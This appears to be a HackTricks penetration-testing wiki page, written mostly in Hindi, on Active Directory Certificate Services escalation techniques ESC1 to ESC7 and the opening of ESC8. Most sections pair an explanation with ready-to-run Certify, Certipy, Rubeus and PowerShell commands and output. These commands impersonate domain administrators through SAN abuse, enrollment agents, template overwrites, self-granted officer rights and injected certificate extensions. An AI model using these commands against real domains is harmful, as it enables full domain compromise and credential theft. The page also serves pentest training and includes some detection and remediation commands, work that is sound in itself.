# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह posts के escalation technique sections का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA द्वारा कम-privileged users को enrolment rights दिए गए हैं।**
- **Manager approval आवश्यक नहीं है।**
- **Authorized personnel के signatures आवश्यक नहीं हैं।**
- **Certificate templates पर security descriptors अत्यधिक permissive हैं, जिससे कम-privileged users को enrolment rights प्राप्त करने की अनुमति मिलती है।**
- **Certificate templates को ऐसे EKUs define करने के लिए configure किया गया है जो authentication की सुविधा देते हैं:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) या no EKU (SubCA) जैसे Extended Key Usage (EKU) identifiers शामिल हैं।
- **Requesters को Certificate Signing Request (CSR) में subjectAltName शामिल करने की अनुमति template द्वारा दी गई है:**
- Active Directory (AD) identity verification के लिए certificate में मौजूद subjectAltName (SAN) को प्राथमिकता देता है। इसका अर्थ है कि CSR में SAN निर्दिष्ट करके किसी भी user (जैसे, domain administrator) का impersonation करने के लिए certificate request किया जा सकता है। Requester द्वारा SAN निर्दिष्ट किया जा सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property द्वारा दर्शाया जाता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag की मौजूदगी requester द्वारा SAN निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> उल्लिखित configuration कम-privileged users को अपनी पसंद के किसी भी SAN के साथ certificates request करने की अनुमति देती है, जिससे Kerberos या SChannel के माध्यम से किसी भी domain principal के रूप में authentication संभव हो जाता है।

यह feature कभी-कभी products या deployment services द्वारा HTTPS या host certificates को on-the-fly generate करने के लिए enable किया जाता है, या समझ की कमी के कारण।

यह उल्लेख किया गया है कि इस option के साथ certificate बनाने पर warning trigger होती है। ऐसा तब नहीं होता जब किसी existing certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled है) को duplicate करके उसमें authentication OID शामिल करने के लिए modify किया जाता है।<sup>[[6]](#references)</sup>

### Abuse

**Vulnerable certificate templates खोजने** के लिए आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **vulnerability का abuse करके administrator का impersonate करने के लिए** कोई चला सकता है:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप generated **certificate को `.pfx`** format में transform कर सकते हैं और इसका उपयोग फिर से **Rubeus या certipy का उपयोग करके authenticate** करने के लिए कर सकते हैं:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" और "Certutil.exe" का उपयोग PFX generate करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema के भीतर certificate templates की enumeration, विशेष रूप से उन templates की जिनमें approval या signatures आवश्यक नहीं हैं, जिनमें Client Authentication या Smart Card Logon EKU मौजूद है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled है, निम्नलिखित LDAP query चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### व्याख्या

दूसरा abuse scenario पहले वाले का एक variation है:

1. Enterprise CA द्वारा low-privileged users को enrollment rights दिए गए हैं।
2. Manager approval की requirement disabled है।
3. Authorized signatures की आवश्यकता omitted है।
4. Certificate template पर overly permissive security descriptor low-privileged users को certificate enrollment rights देता है।
5. **Certificate template को Any Purpose EKU या बिना EKU के शामिल करने के लिए defined किया गया है।**

**Any Purpose EKU** attacker को **किसी भी purpose** के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing आदि शामिल हैं। **ESC3 के लिए उपयोग की गई वही technique** इस scenario का exploitation करने के लिए इस्तेमाल की जा सकती है।

**बिना EKUs वाले certificates**, जो subordinate CA certificates के रूप में कार्य करते हैं, का exploitation **किसी भी purpose** के लिए किया जा सकता है और इनका उपयोग **नए certificates को sign करने के लिए भी किया जा सकता है**। इसलिए, attacker subordinate CA certificate का उपयोग करके नए certificates में arbitrary EKUs या fields निर्दिष्ट कर सकता है।

हालांकि, **domain authentication** के लिए बनाए गए नए certificates कार्य नहीं करेंगे यदि subordinate CA पर **`NTAuthCertificates`** object द्वारा trust नहीं किया गया हो, जो default setting है। फिर भी, attacker **किसी भी EKU** और arbitrary certificate values वाले **नए certificates बना सकता है**। इनका संभावित रूप से विभिन्न purposes (जैसे code signing, server authentication आदि) के लिए **abuse** किया जा सकता है और SAML, AD FS या IPSec जैसे network के अन्य applications पर इनके significant implications हो सकते हैं।<sup>[[6]](#references)</sup>

AD Forest के configuration schema में इस scenario से match करने वाले templates को enumerate करने के लिए, निम्नलिखित LDAP query चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

यह scenario पहले और दूसरे scenario जैसा है, लेकिन इसमें **एक अलग EKU** (Certificate Request Agent) और **2 अलग templates** का **abuse** किया जाता है (इसलिए इसमें requirements के 2 sets होते हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft documentation में **Enrollment Agent** कहा जाता है, किसी principal को **किसी अन्य user की ओर से certificate के लिए enroll** करने की अनुमति देता है।

**“enrollment agent”** ऐसे **template** में enroll करता है और प्राप्त **certificate का उपयोग अन्य user की ओर से CSR को co-sign करने के लिए करता है**। इसके बाद वह **co-signed CSR** को CA को **भेजता** है और ऐसे **template** में enroll करता है जो **“enroll on behalf of”** की अनुमति देता है। CA फिर **“अन्य” user से संबंधित certificate** लौटाता है।<sup>[[6]](#references)</sup>

**Requirements 1:**

- Enterprise CA द्वारा low-privileged users को enrollment rights दिए गए हैं।
- Manager approval की requirement हटा दी गई है।
- Authorized signatures की कोई requirement नहीं है।
- Certificate template का security descriptor अत्यधिक permissive है और low-privileged users को enrollment rights देता है।
- Certificate template में Certificate Request Agent EKU शामिल है, जो अन्य principals की ओर से अन्य certificate templates के request की अनुमति देता है।

**Requirements 2:**

- Enterprise CA low-privileged users को enrollment rights देता है।
- Manager approval को bypass किया गया है।
- Template का schema version या तो 1 है या 2 से अधिक है, और यह ऐसी Application Policy Issuance Requirement निर्दिष्ट करता है जिसके लिए Certificate Request Agent EKU आवश्यक है।
- Certificate template में defined एक EKU domain authentication की अनुमति देता है।
- CA पर enrollment agents के लिए restrictions लागू नहीं की गई हैं।

### Abuse

आप इस scenario का abuse करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users** जिन्हें **obtain** करने की अनुमति है **enrollment agent certificate**, वे templates जिनमें enrollment **agents** को enroll करने की अनुमति है, और वे **accounts** जिनकी ओर से enrollment agent कार्य कर सकता है, enterprise CAs द्वारा सीमित किए जा सकते हैं। यह `certsrc.msc` **snap-in** खोलकर, **CA पर right-click करके**, **Properties पर क्लिक करके**, और फिर “Enrollment Agents” tab पर **navigating** करके किया जाता है।

हालाँकि, यह ध्यान दिया गया है कि CAs की **default** setting “**Do not restrict enrollment agents**” होती है। जब administrators enrollment agents पर restriction सक्षम करते हैं और इसे “Restrict enrollment agents” पर सेट करते हैं, तब भी default configuration अत्यंत permissive रहती है। यह **Everyone** को सभी templates में किसी भी व्यक्ति के रूप में enroll करने की access देती है।

### केवल Windows के लिए PowerShell PoCs with Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) Certify या Certipy के बिना ESC1 और ESC2/ESC3 का अभ्यास करता है। इसकी scripts `X509Enrollment` COM API के साथ एक exportable 2048-bit RSA key बनाती हैं, PKCS#10 request तैयार करती हैं, LDAP के माध्यम से पहला `pKIEnrollmentService` खोजती हैं, उसे `CertificateAuthority.Request` के माध्यम से submit करती हैं, response को `Cert:\CurrentUser\My` में install करती हैं, और Base64-encoded PFX export करती हैं। ESC1 script attacker-selected UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`) जोड़ती है, जबकि ESC2/ESC3 scripts पहली certificate का उपयोग करके on-behalf-of PKCS#7 request sign करती हैं।<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Scripts **PFX** का Base64 प्रिंट करती हैं, जिसमें private key शामिल होती है, ताकि इसे Rubeus के साथ सीधे उपयोग किया जा सके। इसे `[Convert]::ToBase64String($cert.RawData)` से replace न करें: `RawData` केवल public certificate को encode करता है और PKINIT request पर sign नहीं कर सकता।<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Vulnerable Certificate Template Access Control - ESC4

### **व्याख्या**

**certificate templates** पर मौजूद **security descriptor**, यह निर्धारित करता है कि **AD principals** के पास **template** से संबंधित कौन-सी **permissions** हैं।

यदि किसी **attacker** के पास **template** को **alter** करने और **prior sections** में बताई गई किसी भी **exploitable misconfigurations** को **institute** करने के लिए आवश्यक **permissions** हों, तो **privilege escalation** संभव हो सकता है।

**certificate templates** पर लागू होने वाली महत्वपूर्ण **permissions** में शामिल हैं:<sup>[[6]](#references)</sup>

- **Owner:** object पर implicit control प्रदान करता है, जिससे किसी भी attributes को modify किया जा सकता है।
- **FullControl:** object पर complete authority सक्षम करता है, जिसमें किसी भी attributes को alter करने की क्षमता शामिल है।
- **WriteOwner:** object के owner को attacker के control वाले principal में बदलने की अनुमति देता है।
- **WriteDacl:** access controls को adjust करने की अनुमति देता है, जिससे attacker को संभावित रूप से FullControl दिया जा सकता है।
- **WriteProperty:** किसी भी object properties को edit करने की अनुमति देता है।

### दुरुपयोग

templates और अन्य PKI objects पर edit rights वाले principals की पहचान करने के लिए, Certify से enumerate करें:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
पिछले वाले जैसा privesc उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी user के पास certificate template पर write privileges होते हैं। इसका दुरुपयोग, उदाहरण के लिए, certificate template के configuration को overwrite करके template को ESC1 के प्रति vulnerable बनाने के लिए किया जा सकता है।

जैसा कि ऊपर दिए गए path में हम देख सकते हैं, केवल `JOHNPC` के पास ये privileges हैं, लेकिन हमारे user `JOHN` के पास `JOHNPC` के लिए नया `AddKeyCredentialLink` edge है। चूंकि यह technique certificates से संबंधित है, इसलिए मैंने इस attack को भी implement किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है।<sup>[[8]](#references)</sup> यहाँ victim का NT hash retrieve करने के लिए Certipy के `shadow auto` command की एक छोटी-सी झलक दी गई है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक single command से certificate template की configuration को overwrite कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy configuration को **ESC1 के प्रति vulnerable** बनाने के लिए **overwrite** करेगा। हम पुरानी configuration को save करने के लिए **`-save-old` parameter भी निर्दिष्ट कर सकते हैं**, जो हमारे attack के बाद configuration को **restore करने** में उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

आपस में जुड़े ACL-based संबंधों का विस्तृत जाल, जिसमें certificate templates और certificate authority के अलावा कई अन्य objects शामिल हैं, पूरे AD CS system की security को प्रभावित कर सकता है। Security पर महत्वपूर्ण प्रभाव डालने वाले इन objects में शामिल हैं:

- CA server का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे mechanisms के माध्यम से compromise किया जा सकता है।
- CA server का RPC/DCOM server।
- विशिष्ट container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर कोई भी descendant AD object या container। इस path में Certificate Templates container, Certification Authorities container, NTAuthCertificates object और Enrollment Services Container जैसे containers और objects शामिल हैं, लेकिन यह सूची इन्हीं तक सीमित नहीं है।

यदि कोई low-privileged attacker इन critical components में से किसी पर control प्राप्त करने में सफल हो जाता है, तो PKI system की security compromise हो सकती है।<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किया गया विषय **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag के प्रभावों को भी छूता है, जैसा कि Microsoft द्वारा बताया गया है। जब यह configuration किसी Certification Authority (CA) पर activate होती है, तो यह **any request** में **subject alternative name** के भीतर **user-defined values** शामिल करने की अनुमति देती है, जिसमें Active Directory® से बनाए गए requests भी शामिल हैं। परिणामस्वरूप, यह सुविधा किसी **intruder** को **domain authentication** के लिए configured **any template** के माध्यम से enroll करने देती है—विशेष रूप से वे templates जो **unprivileged** user enrollment के लिए खुले हों, जैसे standard User template। इसके परिणामस्वरूप, एक certificate प्राप्त किया जा सकता है, जिससे intruder domain administrator या domain के भीतर मौजूद **any other active entity** के रूप में authenticate कर सकता है।<sup>[[9]](#references)</sup>

**Note**: Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका, `certreq.exe` में `-attrib "SAN:"` argument के माध्यम से, ESC1 में SANs की exploitation strategy से अलग है। यहां अंतर इस बात में है कि account information किस प्रकार encapsulate की जाती है—एक extension के बजाय certificate attribute के भीतर।

### Abuse

यह verify करने के लिए कि setting activate है या नहीं, organizations `certutil.exe` के साथ निम्न command का उपयोग कर सकती हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह operation मूल रूप से **remote registry access** का उपयोग करता है, इसलिए, एक वैकल्पिक तरीका यह हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) जैसे tools इस misconfiguration का पता लगाने और इसका शोषण करने में सक्षम हैं:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन settings को बदलने के लिए, यह मानते हुए कि आपके पास **domain administrative** rights या equivalent अधिकार हैं, निम्न command किसी भी workstation से execute की जा सकती है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने environment में इस configuration को disable करने के लिए, flag को इस command से हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> मई 2022 के security updates के बाद जारी किए गए नए **certificates** में एक **security extension** शामिल होगा, जिसमें **requester की `objectSid` property** सम्मिलित होगी। ESC1 के लिए, यह SID निर्दिष्ट SAN से प्राप्त होता है। हालांकि, **ESC6** के लिए, SID SAN के बजाय **requester की `objectSid`** को दर्शाता है।\
> ESC6 का exploit करने के लिए, system का ESC10 (Weak Certificate Mappings) के प्रति susceptible होना आवश्यक है, जो **new security extension के बजाय SAN को प्राथमिकता देता है**।

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate authority के लिए access control permissions के एक समूह के माध्यम से maintain किया जाता है, जो CA actions को नियंत्रित करता है। इन permissions को `certsrv.msc` खोलकर, CA पर right-click करके, properties चुनकर और फिर Security tab पर जाकर देखा जा सकता है। इसके अतिरिक्त, permissions को PSPKI module का उपयोग करके निम्न जैसे commands के माध्यम से enumerate किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्राथमिक rights, अर्थात् **`ManageCA`** और **`ManageCertificates`**, के बारे में जानकारी प्रदान करता है, जो क्रमशः “CA administrator” और “Certificate Manager” की भूमिकाओं से संबंधित हैं।<sup>[[6]](#references)</sup>

#### Abuse

किसी certificate authority पर **`ManageCA`** rights होने से principal PSPKI का उपयोग करके settings को remotely manipulate कर सकता है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag को toggle करना भी शामिल है, जिससे किसी भी template में SAN specification की अनुमति मिलती है—यह domain escalation का एक महत्वपूर्ण पहलू है।

PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके इस प्रक्रिया को सरल बनाया जा सकता है, जिससे direct GUI interaction के बिना modifications किए जा सकते हैं।

**`ManageCertificates`** rights होने से pending requests को approve करना संभव हो जाता है, जिससे "CA certificate manager approval" safeguard को प्रभावी रूप से bypass किया जा सकता है।

Certificate का request, approval और download करने के लिए **Certify** और **PSPKI** modules के combination का उपयोग किया जा सकता है:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> **पिछले attack** में **`Manage CA`** permissions का उपयोग **EDITF_ATTRIBUTESUBJECTALTNAME2** flag को **enable** करने के लिए किया गया था, ताकि **ESC6 attack** किया जा सके, लेकिन CA service (`CertSvc`) के restart होने तक इसका कोई प्रभाव नहीं होगा। जब किसी user के पास **`Manage CA`** access right होता है, तो उसे **service restart** करने की अनुमति भी होती है। हालांकि, इसका यह अर्थ नहीं है कि user service को remotely restart कर सकता है। इसके अलावा, May 2022 security updates के कारण अधिकांश patched environments में E**SC6 सामान्य रूप से काम नहीं कर सकता**।

इसलिए, यहां एक अन्य attack प्रस्तुत किया गया है।

पूर्वापेक्षाएँ:

- केवल **`ManageCA` permission**
- **`Manage Certificates`** permission (**`ManageCA`** से grant की जा सकती है)
- **`SubCA`** certificate template **enabled** होना चाहिए (**`ManageCA`** से enabled किया जा सकता है)

यह technique इस तथ्य पर निर्भर करती है कि **`Manage CA`** _और_ **`Manage Certificates`** access right वाले users **विफल certificate requests जारी** कर सकते हैं। **`SubCA`** certificate template **ESC1** के प्रति vulnerable है, लेकिन केवल **administrators** ही इस template में enroll कर सकते हैं। इसलिए, एक **user** **`SubCA`** में enroll करने का **request** कर सकता है - जिसे **denied** कर दिया जाएगा - लेकिन बाद में manager द्वारा इसे **issue** कर दिया जाएगा।<sup>[[6]](#references)</sup>

#### Abuse

आप अपने user को नया officer बनाकर स्वयं को **`Manage Certificates`** access right **grant** कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template को **CA** पर `-enable-template` parameter के साथ **enabled** किया जा सकता है। Default रूप से, `SubCA` template enabled होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस attack की prerequisites पूरी कर ली हैं, तो हम **`SubCA` template के आधार पर certificate request करके** शुरुआत कर सकते हैं।

**यह request deny कर दी जाएगी**, लेकिन हम private key save कर लेंगे और request ID note कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम `ca` command और `-issue-request <request ID>` parameter का उपयोग करके **विफल certificate** request को issue कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` command और `-retrieve <request ID>` parameter का उपयोग करके **जारी किया गया certificate retrieve** कर सकते हैं।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### व्याख्या

क्लासिक ESC7 abuses (EDITF attributes को enable करना या pending requests को approve करना) के अलावा, **Certify 2.0** ने एक बिल्कुल नया primitive उजागर किया, जिसके लिए Enterprise CA पर केवल *Manage Certificates* (जिसे **Certificate Manager / Officer** role भी कहा जाता है) role की आवश्यकता होती है।<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method को *Manage Certificates* रखने वाला कोई भी principal execute कर सकता है। हालांकि इस method का पारंपरिक उपयोग legitimate CAs द्वारा **pending** requests पर extensions update करने के लिए किया जाता था, attacker इसका abuse करके approval की प्रतीक्षा कर रही request में एक **non-default certificate extension** (उदाहरण के लिए `1.1.1.1` जैसा custom *Certificate Issuance Policy* OID) **append** कर सकता है।

क्योंकि targeted template उस extension के लिए **default value define नहीं करता**, request जारी होने पर CA attacker-controlled value को overwrite नहीं करेगा। इसलिए resulting certificate में attacker द्वारा चुना गया extension शामिल होगा, जो:

* अन्य vulnerable templates की Application / Issuance Policy requirements को पूरा कर सकता है (जिससे privilege escalation हो सकती है)।
* अतिरिक्त EKUs या policies inject कर सकता है, जो certificate को third-party systems में अप्रत्याशित trust प्रदान करती हैं।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 का “कम शक्तिशाली” भाग माना जाता था — अब full privilege escalation या long-term persistence के लिए leverage किया जा सकता है, बिना CA configuration को छुए या अधिक restrictive *Manage CA* right की आवश्यकता के।

#### Certify 2.0 के साथ primitive का abuse

1. **ऐसी certificate request submit करें जो *pending* रहे।** इसे manager approval आवश्यक करने वाले template के साथ force किया जा सकता है:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# लौटाए गए Request ID को नोट कर लें
```

2. नई `manage-ca` command का उपयोग करके pending request में एक custom extension **append** करें:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*यदि template में पहले से *Certificate Issuance Policies* extension define नहीं है, तो ऊपर दिया गया value issuance के बाद सुरक्षित रहेगा।*

3. **Request issue करें** (यदि आपके role के पास *Manage Certificates* approval rights भी हैं) या किसी operator के इसे approve करने की प्रतीक्षा करें। Issue होने के बाद certificate download करें:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. अब resulting certificate में malicious issuance-policy OID शामिल है और इसका उपयोग subsequent attacks (जैसे ESC13, domain escalation आदि) में किया जा सकता है।

> NOTE: यही attack Certipy ≥ 4.7 के साथ `ca` command और `-set-extension` parameter के माध्यम से भी execute किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### व्याख्या

> [!TIP]
> ऐसे environments में जहाँ **AD CS installed** है, यदि कोई **web enrollment endpoint vulnerable** मौजूद हो और कम-से-कम एक **certificate template published** हो, जो **domain computer enrollment और client authentication** की अनुमति देता हो (जैसे default **`Machine`** template), तो **spooler service active** वाले किसी भी computer को attacker द्वारा compromise करना संभव हो जाता है!

AD CS कई **HTTP-based enrollment methods** support करता है, जिन्हें administrators द्वारा install किए जा सकने वाले additional server roles के माध्यम से उपलब्ध कराया जाता है। HTTP-based certificate enrollment के ये interfaces **NTLM relay attacks** के प्रति susceptible हैं। Attacker, **compromised machine से, inbound NTLM के माध्यम से authenticate करने वाले किसी भी AD account का impersonate कर सकता है**। Victim account का impersonate करते हुए, attacker इन web interfaces को access करके `User` या `Machine` certificate templates का उपयोग करके client authentication certificate request कर सकता है।

- **web enrollment interface** (एक पुराना ASP application, जो `http://<caserver>/certsrv/` पर उपलब्ध है) default रूप से केवल HTTP पर चलता है, जो NTLM relay attacks से protection प्रदान नहीं करता। इसके अलावा, यह अपने Authorization HTTP header के माध्यम से केवल NTLM authentication को explicitly permit करता है, जिससे Kerberos जैसे अधिक secure authentication methods लागू नहीं हो पाते।
